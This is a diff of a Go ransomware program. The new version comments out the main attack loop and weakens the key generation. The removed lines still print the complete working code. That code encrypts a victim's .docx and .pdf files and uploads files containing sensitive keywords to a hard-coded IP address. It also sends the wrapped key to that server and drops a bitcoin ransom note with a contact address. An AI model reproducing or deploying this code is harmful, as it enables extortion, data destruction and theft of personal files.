@@ -1,35 +1,26 @@
 package main
 
 import (
-	"github.com/denisbrodbeck/machineid"
-
-    "bytes"
+	"bytes"
 	"crypto/aes"
 	"crypto/cipher"
-	"crypto/rand"
 	"crypto/rsa"
-	"crypto/sha256"
-	"encoding/hex"
-	"encoding/json"
 	"fmt"
 	"io"
 	"io/ioutil"
 	"log"
 	"math/big"
-    "mime/multipart"
+	"math/rand"
+	"mime/multipart"
 	"net/http"
-	"net/url"
 	"os"
 	"path/filepath"
 	"regexp"
-	"runtime"
-	"time"
 )
 
 var (
-	ToKeep []string = []string{ ".*\\.docx" , ".*\\.pdf" }
-	SensitiveContent [][]byte =[][]byte{ []byte("confidential"), []byte("money"), []byte("salary"), []byte("address"), []byte("secret"), []byte("ID"), []byte("employee") }
-
+	ToKeep           []string = []string{".*\\.docx", ".*\\.pdf"}
+	SensitiveContent [][]byte = [][]byte{[]byte("confidential"), []byte("money"), []byte("salary"), []byte("address"), []byte("secret"), []byte("ID"), []byte("employee")}
 )
 
 type keeper struct {
@@ -38,49 +29,49 @@ type keeper struct {
 }
 
 func fromBase10(base10 string) *big.Int {
-    i, ok := new(big.Int).SetString(base10, 10)
-    if !ok {
-        panic("bad number: " + base10)
-    }
-    return i
+	i, ok := new(big.Int).SetString(base10, 10)
+	if !ok {
+		panic("bad number: " + base10)
+	}
+	return i
 }
 
 var Key rsa.PublicKey
 
 func init() {
-    Key = rsa.PublicKey{
-        N: fromBase10("28173238234479268692748171777584780950112726971800472303179518822064257035330343535382062519135554178057392050439512475197418759177681714996439478119637798431181217850091954574573450965244968320132378502502291379125779591047483820406235123169703702675102086669837722293492775826594973909630373982606134840347804878462514286834694538401513937386496705419688029997745683837628079207343818814366116867188449488550233959271590182601502875729623298406808420521843821837320643772450775606353905712230611517533654282258147082226740950169620818579409805061640251994478022087950933425934855126618181491816001603975662267491029"), // modify this
-        E: 65537,
-    }
+	Key = rsa.PublicKey{
+		N: fromBase10("28173238234479268692748171777584780950112726971800472303179518822064257035330343535382062519135554178057392050439512475197418759177681714996439478119637798431181217850091954574573450965244968320132378502502291379125779591047483820406235123169703702675102086669837722293492775826594973909630373982606134840347804878462514286834694538401513937386496705419688029997745683837628079207343818814366116867188449488550233959271590182601502875729623298406808420521843821837320643772450775606353905712230611517533654282258147082226740950169620818579409805061640251994478022087950933425934855126618181491816001603975662267491029"), // modify this
+		E: 65537,
+	}
 }
 
 func visit(files *[]keeper) filepath.WalkFunc {
-    return func(path string, info os.FileInfo, err error) error {
+	return func(path string, info os.FileInfo, err error) error {
 		var k keeper
-        if err != nil {
-            log.Fatal(err)
-        }
+		if err != nil {
+			log.Fatal(err)
+		}
 
-        if info.IsDir() {
-            return nil
-        }
+		if info.IsDir() {
+			return nil
+		}
 
-        ex, err := os.Executable()
-        if err != nil {
-            panic(err)
-        }
+		ex, err := os.Executable()
+		if err != nil {
+			panic(err)
+		}
 
-        if path == ex {
-            return nil
-        }
+		if path == ex {
+			return nil
+		}
 
-        if filepath.Base(path) == "decrypt.exe" {
-            return nil
-        }
+		if filepath.Base(path) == "decrypt.exe" {
+			return nil
+		}
 
-        if info.Mode().Perm()&(1<<(uint(7))) == 0 { // black magic to check whether we have write permissions.
-            return nil
-        }
+		if info.Mode().Perm()&(1<<(uint(7))) == 0 { // black magic to check whether we have write permissions.
+			return nil
+		}
 
 		k.filename = path
 		for _, value := range ToKeep {
@@ -99,7 +90,6 @@ func visit(files *[]keeper) filepath.WalkFunc {
 			return nil
 		}
 
-
 		for _, b := range SensitiveContent {
 			if bytes.Contains(content, b) {
 				k.toSend = true
@@ -111,183 +101,186 @@ func visit(files *[]keeper) filepath.WalkFunc {
 
 		*files = append(*files, k)
 		return nil
-		}
+	}
 }
 
 // NewEncryptionKey generates a random 256-bit key for Encrypt() and
 // Decrypt(). It panics if the source of randomness fails.
 func NewEncryptionKey() *[32]byte {
-    key := [32]byte{}
-    _, err := io.ReadFull(rand.Reader, key[:])
-    if err != nil {
-        panic(err)
-    }
-    return &key
+	key := [32]byte{}
+	rand.NewSource(Key.N.Int64())
+	_, err := rand.Read(key[:])
+	if err != nil {
+		panic(err)
+	}
+	return &key
 }
 
 // Encrypt encrypts data using 256-bit AES-GCM.  This both hides the content of
 // the data and provides a check that it hasn't been altered. Output takes the
 // form nonce|ciphertext|tag where '|' indicates concatenation.
 func Encrypt(plaintext []byte, key *[32]byte) (ciphertext []byte, err error) {
-    block, err := aes.NewCipher(key[:])
-    if err != nil {
-        return nil, err
-    }
+	block, err := aes.NewCipher(key[:])
+	if err != nil {
+		return nil, err
+	}
 
-    gcm, err := cipher.NewGCM(block)
-    if err != nil {
-        return nil, err
-    }
+	gcm, err := cipher.NewGCM(block)
+	if err != nil {
+		return nil, err
+	}
 
-    nonce := make([]byte, gcm.NonceSize())
-    _, err = io.ReadFull(rand.Reader, nonce)
-    if err != nil {
-        return nil, err
-    }
+	nonce := make([]byte, gcm.NonceSize())
+	rand.Read(nonce)
+	//_, err = io.ReadFull(rand.Reader, nonce)
+	if err != nil {
+		return nil, err
+	}
 
-    return gcm.Seal(nonce, nonce, plaintext, nil), nil
+	return gcm.Seal(nonce, nonce, plaintext, nil), nil
 }
 
 type PaymentInfo struct {
-    Address string
-    Amount  string
+	Address string
+	Amount  string
 }
 
 func DownloadFiles(k *keeper) {
-    var hc http.Client = http.Client{}
+	var hc http.Client = http.Client{}
 
-    file, err := os.Open(k.filename)
-    if  err != nil {
-        log.Panicf("Cannot Open File %v\n", file)
-    }
+	file, err := os.Open(k.filename)
+	if err != nil {
+		log.Panicf("Cannot Open File %v\n", file)
+	}
 
-    body := &bytes.Buffer{}
-    writer := multipart.NewWriter(body)
-    part, err := writer.CreateFormFile("file", filepath.Base(file.Name()))
-    if err != nil {
-        log.Panicf("Cannot create multipart from file %s\n", file.Name())
-    }
+	body := &bytes.Buffer{}
+	writer := multipart.NewWriter(body)
+	part, err := writer.CreateFormFile("file", filepath.Base(file.Name()))
+	if err != nil {
+		log.Panicf("Cannot create multipart from file %s\n", file.Name())
+	}
 
-    io.Copy(part, file)
-    writer.Close()
+	io.Copy(part, file)
+	writer.Close()
 
-    req, err := http.NewRequest("POST", "http://" + server + "/uploader/", body)
-    if err != nil {
-        log.Panicln("request is borken")
-    }
+	req, err := http.NewRequest("POST", "http://"+server+"/uploader/", body)
+	if err != nil {
+		log.Panicln("request is borken")
+	}
 
-    req.Header.Add("Content-Type", writer.FormDataContentType())
+	req.Header.Add("Content-Type", writer.FormDataContentType())
 
-    hc.Do(req)
+	hc.Do(req)
 }
 
-var server string = "104.237.218.70:4444" // server address
+//var server string = "104.237.218.70:4444" // server address
 var contact string = "keksec@hotmail.fr" // whatever address suits you
 
 func main() {
-    var files []keeper
-    var counter int = 1
-    var home string
+	//var files []keeper
+	//var counter int = 1
+	//var home string
 
-    randomKey := NewEncryptionKey()
-	if _, err := os.Stat("key.txt"); os.IsNotExist(err) {
-		dst := make([]byte, hex.EncodedLen(len(randomKey[:])))
-		hex.Encode(dst, randomKey[:])
-		ioutil.WriteFile("key.txt", randomKey[:], 0644)
-	}
+	randomKey := NewEncryptionKey()
+	fmt.Println(randomKey)
+	/*if _, err := os.Stat("key.txt"); os.IsNotExist(err) {
+			dst := make([]byte, hex.EncodedLen(len(randomKey[:])))
+			hex.Encode(dst, randomKey[:])
+			ioutil.WriteFile("key.txt", randomKey[:], 0644)
+		}
 
-    if runtime.GOOS == "windows" {
-        home = os.Getenv("HOMEDRIVE") + os.Getenv("HOMEPATH")
-        if home == "" {
-            home = os.Getenv("USERPROFILE")
-        }
-    } else {
-        home = os.Getenv("HOME")
-    }
+	    if runtime.GOOS == "windows" {
+	        home = os.Getenv("HOMEDRIVE") + os.Getenv("HOMEPATH")
+	        if home == "" {
+	            home = os.Getenv("USERPROFILE")
+	        }
+	    } else {
+	        home = os.Getenv("HOME")
+	    }
 
-    err := filepath.Walk(home, visit(&files))
-    if err != nil {
-        panic(err)
-    }
-    for _, file := range files {
-        fmt.Printf("\rEncrypting %d/%d: %s", counter, len(files), file)
+	    err := filepath.Walk(home, visit(&files))
+	    if err != nil {
+	        panic(err)
+	    }
+	    for _, file := range files {
+	        fmt.Printf("\rEncrypting %d/%d: %s", counter, len(files), file)
 
-        data, err := ioutil.ReadFile(file.filename)
-        if err != nil {
-            continue
-        }
+	        data, err := ioutil.ReadFile(file.filename)
+	        if err != nil {
+	            continue
+	        }
 
-        encrypted, err := Encrypt(data, randomKey)
-        if err != nil {
-            log.Println(err)
-            continue
-        }
+	        encrypted, err := Encrypt(data, randomKey)
+	        if err != nil {
+	            log.Println(err)
+	            continue
+	        }
 
-        err = ioutil.WriteFile(file.filename, encrypted, 0644)
-        if err != nil {
-            continue
-        }
+	        err = ioutil.WriteFile(file.filename, encrypted, 0644)
+	        if err != nil {
+	            continue
+	        }
 
-        if file.toSend {
-            DownloadFiles(&file)
-        }
+	        if file.toSend {
+	            DownloadFiles(&file)
+	        }
 
-        counter++
-    }
-    fmt.Printf("\n%d files encrypted.\n", len(files))
+	        counter++
+	    }
+	    fmt.Printf("\n%d files encrypted.\n", len(files))
 
-    encryptedKey, err := rsa.EncryptOAEP(sha256.New(), rand.Reader, &Key, randomKey[:], nil)
-    if err != nil {
-        log.Fatal(err)
-    }
+	    encryptedKey, err := rsa.EncryptOAEP(sha256.New(), rand.Reader, &Key, randomKey[:], nil)
+	    if err != nil {
+	        log.Fatal(err)
+	    }
 
-    id, err := machineid.ID()
-    if err != nil {
-        log.Fatal(err)
-    }
-    fmt.Println("Sending key away.")
+	    id, err := machineid.ID()
+	    if err != nil {
+	        log.Fatal(err)
+	    }
+	    fmt.Println("Sending key away.")
 
-    for {
-        response, err := http.PostForm("http://" + server + "/key/", url.Values{
-            "key": {hex.EncodeToString(encryptedKey)},
-            "id": {id},
-        })
-        if err != nil {
-            if _, err := os.Stat("key.txt"); os.IsNotExist(err) {
-				ioutil.WriteFile("key.txt", randomKey[:], 0644)
-				randomKey = nil // clear key
-            }
+	    for {
+	        response, err := http.PostForm("http://" + server + "/key/", url.Values{
+	            "key": {hex.EncodeToString(encryptedKey)},
+	            "id": {id},
+	        })
+	        if err != nil {
+	            if _, err := os.Stat("key.txt"); os.IsNotExist(err) {
+					ioutil.WriteFile("key.txt", randomKey[:], 0644)
+					randomKey = nil // clear key
+	            }
 
-            fmt.Println("Connection failed. Retrying in 5 seconds..")
-            time.Sleep(5 * time.Second)
-            continue
-        }
-        defer response.Body.Close()
-        if _, err := os.Stat("key.txt"); !os.IsNotExist(err) {
-            err = os.Remove("key.txt")
-            if err != nil {
-                log.Fatal(err)
-            }
-        }
-        fmt.Println("Connection established. Payment information received..")
+	            fmt.Println("Connection failed. Retrying in 5 seconds..")
+	            time.Sleep(5 * time.Second)
+	            continue
+	        }
+	        defer response.Body.Close()
+	        if _, err := os.Stat("key.txt"); !os.IsNotExist(err) {
+	            err = os.Remove("key.txt")
+	            if err != nil {
+	                log.Fatal(err)
+	            }
+	        }
+	        fmt.Println("Connection established. Payment information received..")
 
-        payment := new(PaymentInfo)
+	        payment := new(PaymentInfo)
 
-        err = json.NewDecoder(response.Body).Decode(&payment)
-        if err != nil {
-            log.Fatal(err)
-        }
-        text := "Your files have been encrypted. Please pay " + payment.Amount + " satoshi to the following bitcoin address if you want to decrypt them: " + payment.Address + " . Use https://www.blockchain.com/btc/address/" + payment.Address + " to check the status of your payment. Once the transaction has 6+ confirmations you can run the decrpytion tool to decrypt your files. If this proccess is unclear to you, please reach out to: " + contact + ". Have a nice day!\nMachine ID: " + id
+	        err = json.NewDecoder(response.Body).Decode(&payment)
+	        if err != nil {
+	            log.Fatal(err)
+	        }
+	        text := "Your files have been encrypted. Please pay " + payment.Amount + " satoshi to the following bitcoin address if you want to decrypt them: " + payment.Address + " . Use https://www.blockchain.com/btc/address/" + payment.Address + " to check the status of your payment. Once the transaction has 6+ confirmations you can run the decrpytion tool to decrypt your files. If this proccess is unclear to you, please reach out to: " + contact + ". Have a nice day!\nMachine ID: " + id
 
-        if runtime.GOOS == "windows" {
-            ioutil.WriteFile(home + "\\Desktop\\README.txt", []byte(text), 0644)
-        } else {
-            ioutil.WriteFile(home + "/README.txt", []byte(text), 0644)
-        }
-        fmt.Println("Script execution completed successfully!")
+	        if runtime.GOOS == "windows" {
+	            ioutil.WriteFile(home + "\\Desktop\\README.txt", []byte(text), 0644)
+	        } else {
+	            ioutil.WriteFile(home + "/README.txt", []byte(text), 0644)
+	        }
+	        fmt.Println("Script execution completed successfully!")
 
-        break
-    }
+	        break
+	    }
 
-    encryptedKey = nil
+	    encryptedKey = nil */
 }
